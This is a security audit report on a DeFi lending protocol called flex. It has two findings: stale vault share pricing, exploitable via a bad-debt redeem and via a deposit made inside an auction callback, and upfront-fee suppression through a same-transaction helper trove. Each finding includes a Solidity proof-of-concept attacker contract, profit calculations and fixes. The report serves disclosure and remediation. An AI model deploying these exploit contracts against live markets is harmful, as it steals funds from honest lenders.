# finding_id: FLEX-001

### Finding

Lender vault share pricing is stale with respect to real asset changes on both redeem and deposit paths, enabling atomic value extraction from incumbent lenders via two opposite direction attacks

### Summary

flex's Lender is a Yearn `TokenizedStrategy` whose share price is computed against a cached `totalAssets` snapshot that is only refreshed via keeper-gated `report()` , multiple `TroveManager` and `Auction` flows synchronously change the Lender's real asset balance without refreshing that snapshot , this creates a general arbitrage window against the vault's cached price-per-share (PPS), exploitable atomically by any actor on **both** sides of the vault:

- **Instance A : Redeem-side (bad-debt escape):** after `liquidate_trove` realizes a loss `L` against the Lender, the cached `totalAssets` is unchanged , an existing shareholder can atomically trigger the liquidation and redeem at pre-loss PPS, pushing the full loss onto remaining lenders
- **Instance B : deposit-side (auction-surplus capture):** during `Auction.take()`, the taker callback executes while lender-bound surplus is already determined but not yet transferred, an attacker can, inside that callback, call the permissionless keeper's `report()` and then `deposit()` at the pre-surplus PPS, capturing a pro-rata share of the incoming surplus once it lands

both instances share a single root cause: real Lender assets change synchronously on events flex does not bridge to a yearn snapshot refresh, a single architectural fix closes both

### Description

#### Root cause

`Lender._harvestAndReport()` computes live assets as:

```solidity
// src/lender/Lender.sol:115-117
function _harvestAndReport() internal override returns (uint256) {
    return asset.balanceOf(address(this)) + TROVE_MANAGER.sync_total_debt();
}
```

this is only invoked via the Yearn `report()` path, which is `onlyKeepers`, all share-price reads go through the cached `S.totalAssets`, documented as "as of the last report":

```solidity
// TokenizedStrategy.sol:642-651
// Get the total amount of assets this strategy holds
// as of the last report.
function totalAssets() external view returns (uint256) {
    return _totalAssets(_strategyStorage());
}
```

any state change that alters `asset.balanceOf(lender) + TROVE_MANAGER.sync_total_debt()` without triggering `report()` creates a window in which the PPS used for `deposit()`, `withdraw()`, or `redeem()` is wrong, two such changes are directly reachable by any users, in opposite directions:

| Instance | Delta on real assets | Action mispriced | Attacker role |
| --- | --- | --- | --- |
| A (bad debt) | `−L` (loss) | `redeem()` at inflated PPS | existing shareholder + liquidator |
| B (auction surplus) | `+s` (profit) | `deposit()` at deflated PPS | taker with non-empty callback |


#### Instance A : Redeem-side: atomic bad-debt exit

##### step 1: bad debt is realized in `liquidate_trove`

the underwater branch is entered when seized collateral (incl. liquidation fee) exceeds trove collateral:

```vyper
# src/trove_manager.vy:1023-1029
if collateral_with_fee > trove.collateral:
    is_full_liquidation = True
    debt_to_repay = trove_collateral_in_borrow * borrow_token_precision // (
        borrow_token_precision + liquidation_fee_pct
    )
```

the full trove debt is then removed from global accounting, regardless of what the liquidator pays:

```vyper
# src/trove_manager.vy:1053-1061
# For underwater troves, the full debt (not just what the liquidator pays) is
# subtracted from total_debt, socializing the bad debt as a loss to the lender
self._accrue_interest_and_account_for_trove_change(
    0,
    trove_debt_after_interest,
    0,
    trove_weighted_debt,
)
```

the liquidator only transfers `debt_to_repay` to the Lender:

```vyper
# src/trove_manager.vy:1120-1121
assert extcall self.borrow_token.transferFrom(
    msg.sender,
    self.lender,
    debt_to_repay,
    default_return_value=True
)
```

realized lender loss: `L = trove_debt_after_interest − debt_to_repay`, behavior is intended and exercised by `test/Liquidate.t.sol:942-1003`.

##### Step 2: Lender never refreshes on liquidation

Withdrawal hooks do not resync:

```solidity
// src/lender/Lender.sol:91-99
function _preWithdrawHook(
    uint256, address _receiver, uint256, uint256
) internal override {
    _auctionProceedsReceiver = _receiver;
}

// src/lender/Lender.sol:108-111
function _freeFunds(uint256 _amount) internal override {
    TROVE_MANAGER.redeem(_amount, _auctionProceedsReceiver);
}
```

after `liquidate_trove()`, the Lender's true assets have decreased by `L`, but cached `S.totalAssets` is unchanged

##### Step 3: `redeem()` prices against the stale snapshot

```solidity
// TokenizedStrategy.sol:615-635
assets = _convertToAssets(S, shares, Math.Rounding.Down);
return _withdraw(S, receiver, owner, assets, shares, maxLoss);

// TokenizedStrategy.sol:854-866
return supply == 0
    ? shares
    : shares.mulDiv(_totalAssets(S), supply, _rounding);
```

`report()` is `onlyKeepers` and lives on a separate call-path, so no external actor can interleave it inside the attacker's transaction

##### Exploit A

```solidity
contract BadDebtExit {
    function attack(uint256 badTroveId, uint256 attackerShares) external {
        usdc.approve(address(troveManager), type(uint256).max);

        // 1. Realize bad debt at TroveManager level
        troveManager.liquidate_trove(
            badTroveId, type(uint256).max, address(this), ""
        );

        // 2. Same tx, priced against stale pre-loss totalAssets
        lender.redeem(attackerShares, address(this), address(this));
    }
}
```

if the redemption needs to free non-idle liquidity, `Lender._freeFunds()` calls `TROVE_MANAGER.redeem(_amount, _auctionProceedsReceiver)` with `_auctionProceedsReceiver` already set to the attacker by `_preWithdrawHook()` , `TroveManager._redeem()` then kicks the Dutch Desk auction with proceeds up to `total_debt_decrease` routed to that receiver (`src/trove_manager.vy:1307-1309`), the take path is permissionless; any third party can later fill the auction


#### Instance B : Deposit-side: auction-surplus capture via `take()` callback

##### Step 1: `Auction.take()` callback precedes payment

In `src/auction.vy::take`:

1. Collateral is transferred to `receiver`
2. If `data` is non-empty, `takeCallback(...)` is invoked on `receiver`
3. Only afterwards are buy tokens pulled from `msg.sender` , first up to `needed_amount` to `auction.receiver`, then surplus to `auction.surplus_receiver`

`DutchDesk.kick()` sets `self.lender` as `surplus_receiver`, so auction surplus routes to the Lender, inside the callback, the surplus `s` for this take is already price-determined, but has not yet been transferred to the Lender, because `_harvestAndReport()` reads only `asset.balanceOf(lender) + sync_total_debt()`, a `report()` call at this moment snapshots a pre-surplus state

##### Step 2: permissionless keeper and no deposit limit

`LenderFactory` hard-codes a permissionless `KEEPER` contract and sets it on each deployed Lender, public `report(address)` and `tend(address)` entrypoints, the Lender constructor sets no deposit limit (`type(uint256).max`), and `availableDepositLimit()` itself reads cached `TokenizedStrategy.totalAssets()`

the deposit path mints shares using cached `totalAssets` **before** new assets are added to accounting , `_convertToShares` reads cached assets, and `_deposit` only updates accounting after share computation

##### Step 3: atomic capture

inside the taker callback, the attacker:

1. Calls `Keeper.report(lender)` — fixes cached `totalAssets` at pre-surplus state
2. Calls `lender.deposit(D, attacker)` — mints shares at that deflated PPS
3. Returns. `Auction.take()` then pulls buy tokens: up to `needed_amount` to `auction.receiver`, surplus `s` to the Lender

a later `report()` recognizes `s` as vault profit, but the attacker already holds shares minted before that recognition. Their pro-rata claim on `s` is approximately:

```
captured_surplus ≈ s · D / (A + D)
```

where `A` is Lender assets after the callback-time `report()` and `D` is the attacker's callback-time deposit, as `D` grows relative to `A`, captured share approaches the full surplus of that take

##### Exploit B

```solidity
contract SurplusCapture {
    function attack(uint256 auctionId, uint256 takeAmount, uint256 D) external {
        borrowToken.approve(address(auction), type(uint256).max);
        borrowToken.approve(address(lender), type(uint256).max);

        // Triggers takeCallback() mid-execution (non-empty data)
        auction.take(auctionId, takeAmount, address(this), abi.encode(D));
    }

    function takeCallback(bytes calldata data) external {
        uint256 D = abi.decode(data, (uint256));

        // 1. Snapshot cached totalAssets at pre-surplus state
        keeper.report(address(lender));

        // 2. Mint shares at deflated PPS (surplus not yet transferred)
        lender.deposit(D, address(this));

        // Return -> Auction.take() now pulls buy tokens; surplus -> Lender
    }
}
```

if no suitable redemption auction exists, the attacker can self-kick one by borrowing above idle liquidity , the Flex UI already documents that insufficient idle liquidity causes redemptions, tis is auxiliary, not required if a live auction is available

##### Why Flex's existing mitigation is insufficient

flex's own `LaggingOracleValueExtractionPOC` describes the intended fix for stale-oracle extraction as "surplus goes to Lender, not redeemer" and verifies the Lender's post-`take()` balance using `auction.take(..., "")` with an **empty** callback , it does not exercise the non-empty callback path where the taker executes `report()` + `deposit()` before the surplus transfer,

user-facing documentation stating that "redemption proceeds are paid to the redeemer" is stale wording , code confirm security intent: only up to `maximum_amount` goes to the receiver, surplus is reserved for the Lender, instance B bypasses that economic intent without violating the literal accounting (surplus does arrive at the Lender; the attacker just owns fresh shares against it)



### exploitable atomically (both instances)

neither instance is a mempool race or a "keeper is late" theory

- Instance A: both steps fit in one attacker-controlled transaction; `report()` is `onlyKeepers` and cannot interleave
- Instance B: the vulnerable window exists inside a single synchronous `Auction.take()` call , collateral transfer -> callback -> payment + surplus transfer, the attacker controls the callback and therefore controls the timing; the pre-surplus state persists for the duration of the callback by construction

### impact

**Severity: High**

direct, repeatable, theft of value from incumbent lenders, not Critical because loss is bounded per event (bad-debt size or per-take auction surplus) and by attacker capital, not arbitrary vault principal, 

**Instance A : Bad-debt escape.** Let `A` = cached `totalAssets` before liquidation, `S` = share supply, `s` = attacker shares, `L` = realized bad debt

| Quantity | Formula |
| --- | --- |
| Fair post-loss redemption | `s · (A − L) / S` |
| Stale (actual) redemption | `s · A / S` |
| **Value extracted from remaining lenders** | **`s · L / S`** |

worked example: `A = 1,000,000 USDC`, `S = 1,000,000 shares`, `s = 100,000` (10% of supply), `L = 100,000 USDC`

- Fair redemption: `100,000 × 900,000 / 1,000,000` = **90,000 USDC**
- Stale redemption: `100,000 × 1,000,000 / 1,000,000` = **100,000 USDC**
- **Excess extracted:** 10,000 USDC, borne by the remaining 900,000 shares

in the limit where a single lender holds majority supply, they can avoid essentially the entire loss and push it onto the minority

**Instance B : surplus capture.** Let `A` = Lender assets after the callback-time `report()`, `D` = attacker's callback-time deposit, `s` = surplus that code intends to route to the Lender alone

```
captured_surplus ≈ s · D / (A + D)
```

existing lenders lose the same amount, as `D` grows relative to `A`, the attacker's captured share approaches the full surplus of that take, repeatable across every auction with positive surplus potential; attacker can self-generate qualifying auctions by borrowing above idle liquidity

**Combined effect.** the vault leaks value on every bad-debt event (outflow asymmetry) and on every redemption auction with surplus (inflow asymmetry), both are atomic, unprivileged, and compound over time against honest lenders


### Root cause 

share accounting and real-asset accounting are decoupled across modules with different update cadences:

- `TroveManager` and `Auction` change real Lender assets **synchronously** (bad debt on liquidation, surplus on `take()` completion).
- Yearn `TokenizedStrategy` udates its share-pricing snapshot **only** on keeper-gated `report()`

`Lender.sol` does not bridge these, any state-changing event that alters `asset.balanceOf(lender) + TROVE_MANAGER.sync_total_debt()` but does not trigger `report()` opens an arbitrage window of identical shape, bad debt and auction surplus are the two currently-reachable unprivileged instances, attacking opposite sides of the vault (`redeem` vs `deposit`) with opposite delta signs, any future flow with the same structural property (synchronous asset delta without a report refresh) will reproduce this vulnerability


### Affected contracts / functions

Core vulnerable paths:

- `src/auction.vy::take` : callback-before-payment ordering (Instance B)
- `src/dutch_desk.vy::kick` : sets Lender as `surplus_receiver` (Instance B)
- `src/trove_manager.vy::liquidate_trove` : realizes `L` without report (Instance A)
- `src/trove_manager.vy::_redeem` : redemption auction proceeds path (Instance A)
- `src/lender/Lender.sol::_harvestAndReport`, `_preWithdrawHook`, `_freeFunds` : missing bridge (both)
- Inherited `TokenizedStrategy`: `totalAssets`, `_convertToShares`, `_convertToAssets`, `deposit`, `redeem`, `withdraw`, `report` (both)

enabler:

- `src/lender/LenderFactory.sol` : permissionless `KEEPER`, `deploy` / `setKeeper` (Instance B)

auxiliary (Instance B only, if attacker self-kicks an auction):

- `src/trove_manager.vy::_transfer_borrow_tokens`



### Recommendation

both instances are closed by the same architectural principle: **bridge real-asset changes to the cached snapshot before any mispriceable share operation, and remove the asymmetric callback ordering at its source**

1. **Refresh the snapshot on both deposit and withdraw paths in `Lender.sol`.** override `_preWithdrawHook` and add a pre-deposit hook that invokes the internal report-equivalent so `_convertToShares` / `_convertToAssets` always see post-event assets, this fully closes Instance A and blocks Instance B at the mint step , the in-callback `deposit()` will price against a snapshot that correctly excludes the not-yet-transferred surplus

2. **Re-order `Auction.take()` so that the surplus transfer to `surplus_receiver` happens before the taker callback**, or equivalently defer the callback until after all buy-token transfers settle, tis eliminates the callback-time mispricing window at the source and defends against future variants that read Lender state from inside the callback for any other purpose

3. **gate callback-time reentry into `Lender.deposit()` during an in-flight `Auction.take()` that routes surplus to the Lender.** a transient flag on the Lender (e.g., `_auctionInFlight`) set by `DutchDesk.kick()` and cleared on `Auction.take()` completion, checked in `availableDepositLimit()`, blocks exploit B even if fixes (1) or (2) are deferred or bypassed by a future code change

Fix (1) alone is sufficient to address both Instance A and Instance B by making PPS reads always current, Fix (2) is the structurally cleanest , it removes the asymmetric callback ordering that creates the Instance B window at its source, applying both produces the strongest invariant: share price is always current *and* the callback can never observe a half-settled auction state


# finding_id: FLEX-002



`open_trove` / `borrow` / `adjust_interest_rate` price the upfront fee from the live branch average after attacker controlled debt is already inserted, allowing an atomic helper trove round trip to suppress the fee owed to lenders


flex's upfront fee is documented as "one week of the market's average interest rate" and its stated purpose is to "discourage borrowers from choosing unrealistically low interest rates", in code, the fee is computed by `_get_upfront_fee` against the post insertion average , i.e. the average after the borrower's own debt is folded into `total_debt` and `total_weighted_debt`,
an attacker can therefore atomically (i) open a huge helper trove `H` at `min_annual_interest_rate` (0.5%) to depress the live average, (ii) execute the real fee bearing action (`open_trove`, `borrow`, or premature `adjust_interest_rate)` so its fee is quoted against the now depressed average, and (iii) immediately `close_trove(H)` in the same transaction, because `_get_trove_debt_after_interest` only accrues for `block.timestamp − last_debt_update_time`, the helper closes for `principal + helper_upfront_fee` and zero elapsed interest , the helper is effectively a free fee suppression primitive,
the missing fee is a direct loss to lenders, since `Lender._harvestAndReport()` values the vault via `borrow.balanceOf(self) + TROVE_MANAGER.sync_total_debt()`, and the docs explicitly list upfront fees as one of the three lender revenue streams



### step 1 , fee is priced from the post-insertion average

`src/trove_manager.vy:1363-1394:`

```vyper
new_total_debt: uint256 = self.total_debt if is_existing_debt else self.total_debt + debt_amount
new_total_weighted_debt: uint256 = self.total_weighted_debt if is_existing_debt else self.total_weighted_debt + (debt_amount * annual_interest_rate)
avg_interest_rate: uint256 = new_total_weighted_debt // new_total_debt
upfront_fee: uint256 = self._calculate_accrued_interest(debt_amount * avg_interest_rate, self.upfront_interest_period)
```
the basis for the fee is the average over the live state at the moment of the call, the function trusts that `self.total_debt` and `self.total_weighted_debt` were not just artificially warped by the same caller in a preceding call within the same transaction

### step 2  `open_trove` writes the helper into global accounting before the real action

`src/trove_manager.vy:317-431:`
```vyper
upfront_fee: uint256 = self._get_upfront_fee(debt_amount, annual_interest_rate, max_upfront_fee)
debt_amount_with_fee: uint256 = debt_amount + upfront_fee
...
self.troves[trove_id] = Trove(debt=debt_amount_with_fee, ..., last_debt_update_time=convert(block.timestamp, uint64), ...)

self._accrue_interest_and_account_for_trove_change(
    debt_amount_with_fee,                          # debt_increase
    0,
    debt_amount_with_fee * annual_interest_rate,   # weighted_debt_increase
    0,
)
...
self._transfer_borrow_tokens(debt_amount, annual_interest_rate, min_borrow_out, min_collateral_out)
```
after this call returns, `total_debt` and `total_weighted_debt` already reflect the helper, any subsequent `_get_upfront_fee` call inside the same transaction sees the depressed average

the same shape exists in `borrow()` (`src/trove_manager.vy:564-609`) and in `adjust_interest_rate()`'s premature path (`src/trove_manager.vy:725-771`) , `both call _get_upfront_fee against` the same global state

### step 3 : `close_trove` removes the helper at zero time-cost in the same transaction

`src/trove_manager.vy:787-843:`
```vyper
trove_debt_after_interest: uint256 = self._get_trove_debt_after_interest(trove)
...
self._accrue_interest_and_account_for_trove_change(
    0,
    trove_debt_after_interest,                          # debt_decrease
    0,
    old_trove.debt * old_trove.annual_interest_rate,    # weighted_debt_decrease
)
...
assert extcall self.borrow_token.transferFrom(msg.sender, self.lender, trove_debt_after_interest, ...)
_get_trove_debt_after_interest (src/trove_manager.vy:1399-1408):
vyperreturn trove.debt + self._calculate_accrued_interest(
    trove.debt * trove.annual_interest_rate,
    block.timestamp - convert(trove.last_debt_update_time, uint256)
)
```
within a single transaction, `block.timestamp == trove.last_debt_update_time` (set in step 2), so the elapsed time term is zero and `trove_debt_after_interest == trove.debt == helper_principal + helper_upfront_fee`, the attacker repays exactly that, gets the helper collateral back, and the global accounting is rolled back

### step 4 : the owner-self-skip in `_redeem` keeps the helper alive during the real action

`src/trove_manager.vy:1213-1215`:
```vyper
# Don't redeem a borrower's own Trove, unless it's a zombie. A borrower with multiple
# Troves can have one become zombie and acting on another Trove should clear it
if msg.sender != trove.owner or is_zombie_trove:
```

because the attacker contract owns both the helper and the real trove (allowed: trove ID = `keccak256(msg.sender, owner_index)` per `src/trove_manager.vy:359-360`, and the docs state "each address may own one or more Troves"), the real action's redemption fallback cannot consume the helper

### explotibility

no race against any other actor, `block.timestamp` is constant inside one transaction, the global state is mutated synchronously between sub calls, and `close_trove` is a simple external function callable in the same call frame, attacker contract performs the entire sequence

```
open helper (min rate)  ->  real open / borrow / adjust  →  close helper
```

the only physical constraint is that the helper needs idle Lender liquidity to receive its borrow toktns , a normal live market state since flex's Lender is a Yearn style vault that holds idle deposits between borrow events , yhe helper size can be sized to whatever idle liquidity is available; the attack still produces a saving proportional to the depression effect

## impact

lender share value is lowered by exactly the under collected fee on every successful round-trip, under Lender.sol:115-117:

```solidity
function _harvestAndReport() internal override returns (uint256) {
    return asset.balanceOf(address(this)) + TROVE_MANAGER.sync_total_debt();
}
```

the recorded debt is what the lender will eventually be paid through repayment / interest; under recording the upfront fee permanently subtracts from that stream, the attacker pays the helper's small upfront fee but saves a much larger amount on the real fee

a second, parallel impact: the premature Rate Adjustment Fee is also computed via `_get_upfront_fee` (with `is_existing_debt=True`) and is also depressed by the helper, the docs state this fee exists "to prevent borrowers from temporarily increasing their rate to avoid redemptions and then immediately lowering it again" , that deterrent is weakened


### example:

state and value:

- existing branch debt
   - 5,000,000 at 1%
- Real borrow
   - 1,000,000 at 250%
- Helper borrow
   - 15,000,000 at 0.5%

Quantity and Value

- Honest fee (no helper)
   - 8,150.684931
- Helper fee
   - 1,797.945205
- Real fee while helper is live
   - 2,397.063256
- Attacker total paid
   - 4,195.008461
- Lender loss / attacker saving
   - 3,955.676470 (≈48.5% of the honest fee)


on the live yvUSD/USDC mainnet market (borrow token = USDC, 6-dec), the same shape applies with rounding dust: saving ≈ 3,955.69 USDC per round-trip

the attack is repeatable: the attacker can run it on every borrow they make, every rate adjustment during cooldown, and across multiple campaigns


# attack

> Attacker has, or flash borrows, enough collateral for both the helper and the real trove. Borrow tokens received by the helper are returned at close

```solidity
contract FeeSuppression {
    ITroveManager TM;
    IERC20 coll;
    IERC20 borrow;

    // owner_index 0 = helper, owner_index 1 = real
    function attack(
        uint256 collForHelper,
        uint256 helperDebt,
        uint256 helperPrev,
        uint256 helperNext,
        uint256 collForReal,
        uint256 realDebt,
        uint256 realRate,
        uint256 realPrev,
        uint256 realNext
    ) external {
        coll.approve(address(TM), type(uint256).max);
        borrow.approve(address(TM), type(uint256).max);

        // 1. Open helper at min_annual_interest_rate (0.5%)
        //    Updates total_debt / total_weighted_debt -> live average is depressed
        uint256 helperId = TM.open_trove(
            0,                          // owner_index
            collForHelper,
            helperDebt,
            helperPrev, helperNext,     // sorted_troves position
            5e15,                       // min_annual_interest_rate (0.5% in 18-dec)
            type(uint256).max,          // max_upfront_fee
            0, 0,                       // min_borrow_out, min_collateral_out
            address(this)
        );

        // 2. Real fee-bearing action — _get_upfront_fee now reads the depressed average
        uint256 realId = TM.open_trove(
            1,
            collForReal, realDebt,
            realPrev, realNext, realRate,
            type(uint256).max,
            0, 0,
            address(this)
        );

        // 3. Close helper in the same tx. block.timestamp unchanged ->
        //    _get_trove_debt_after_interest returns trove.debt exactly
        //    Helper repays principal + helper_upfront_fee, reclaims its collateral
        TM.close_trove(helperId);

        // End state: only the real trove remains, paid less than the honest fee
    }
}
```

same structure works substituting step 2 with `borrow(existingTroveId, ...)` for an existing trove or `adjust_interest_rate(existingTroveId, ..., max_upfront_fee)` during cooldown



> the helper is not redeemed during step 2: `_redeem` self-skips owner troves (`src/trove_manager.vy:1213-1215`), and a min rate redeemer can't redeem other min-rate troves anyway (`src/trove_manager.vy:1207-1208`)
> `min_borrow_out = 0` and `min_collateral_out = 0` are accepted, so the helper does not need full delivery to be valid
> Helper trove ID and real trove ID differ because `owner_index` differs (`src/trove_manager.vy:360`)

### root Cause
`_get_upfront_fee` measures the post insertion average against state that the same caller is allowed to mutate freely within a single transaction, while `close_trove` charges no minimum elapsed interest floor, the fee basis and the close cost basis decouple in a way that the protocol's stated economic intent (one-week-of-average prepaid interest) cannot be enforced atomically


### recommendation:

- fix the basis, compute `_get_upfront_fee` from `total_debt / total_weighted_debt` before including the new debt, and additionally floor the rate used to `max(avg_rate, k * borrower_rate)` for some `k ∈ (0, 1]`, so a high rate borrower cannot price off a depressed average
- block same block round trip in `close_trove`, require `block.timestamp > trove.last_debt_update_time` (or charge a minimum elapsed interest floor equivalent to a small fraction of `upfront_interest_period * rate`) so the helper cannot be opened and closed in the same transaction at zero time cost

